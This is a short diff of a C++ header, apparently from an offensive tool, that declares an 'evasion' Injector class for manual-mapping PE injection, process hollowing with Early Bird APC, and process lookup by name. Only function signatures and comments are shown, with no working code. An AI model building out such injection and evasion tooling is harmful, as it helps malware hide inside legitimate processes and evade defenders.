@@ -9,9 +9,9 @@ namespace evasion {
 class Injector {
 public:
     // Manual Mapping / PE Injection
-    static bool MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload, PVOID pParam = NULL);
+    static bool MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload, PVOID* ppRemoteBase);
 
-    // Process Hollowing (uses MapAndInject)
+    // Process Hollowing (uses MapAndInject + Early Bird APC)
     static bool HollowProcess(const std::wstring& targetPath, const std::vector<uint8_t>& payload);
 
     // Get Process ID by name
